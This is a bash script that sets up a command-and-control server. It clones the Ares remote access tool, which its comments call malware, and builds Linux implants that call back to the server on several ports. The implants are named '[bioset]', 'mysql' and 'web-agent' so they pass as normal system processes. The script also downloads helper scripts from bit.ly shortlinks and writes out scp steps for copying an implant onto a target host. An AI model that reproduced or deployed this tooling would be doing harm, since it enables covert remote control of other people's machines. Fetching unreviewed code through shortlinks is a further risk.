#!/bin/bash

# Create a VPS call it CNC
# Ubuntu 18.04 # 20.04 doesn't support python 2.7/pip

# Set variables
ipaddress=$(ifconfig | grep "inet " | grep -v "127.0.0" | awk '{print $2}') # set IP address as variable $ipaddress

# first - update and get dependencies
apt-get update -y && apt-get upgrade -y && apt-get dist-upgrade -y
# get coffee refilled
apt-get install python2.7 python-pip -y
apt install python-pip -y

# get in /root and download malware
cd ~
git clone https://github.com/sweetsoftware/Ares.git

# install Ares requirements and initiate the database
cd ~/Ares
pip install -r requirements.txt
cd ~/Ares/server/
./ares.py initdb

# Build the agents
cd ~/Ares/agent/
./builder.py -p Linux --server http://$ipaddress:111 -o \[bioset\]
./builder.py -p Linux --server http://$ipaddress:3306 -o mysql
./builder.py -p Linux --server http://$ipaddress:8080 -o web-agent
### ADD TO LIST AS NEEDED

#Set up tmux
cd ~
# tmux script
wget https://bit.ly/ares-cnc-tmux
mv ~/ares-cnc-tmux ~/ares-tmux.sh
chmod +x ~/ares-tmux.sh
# tmux configuration file
wget https://bit.ly/ares-cnc-tmux-conf
mv ~/ares-cnc-tmux-conf ~/.tmux.conf

# Make deploy.txt
echo '' >> ~/deploy.txt
echo 'To deploy implant' >> ~/deploy.txt
echo 'scp ~/Ares/agent/<IMPLANT_NAME> <USER>@<TARGET_IP>:/<TARGET_DIR>/' >> ~/deploy.txt
echo '' >> ~/deploy.txt


echo '' >> /etc/motd
echo '~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~' >> /etc/motd
echo 'Now run:' >> /etc/motd
echo '~/ares-cnc-tmux' >> /etc/motd
echo '' >> /etc/motd
echo 'Inside tmux:' >> /etc/motd
echo '  Press [Ctrl-A] then [tab_number] to select a tab' >> /etc/motd
echo '~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~' >> /etc/motd
echo '' >> /etc/motd


echo ''
echo 'Now reboot and then log back in'
echo ''
read -rsp $'Press any key to continue...\n' -n1 key
echo ''
shutdown -r now

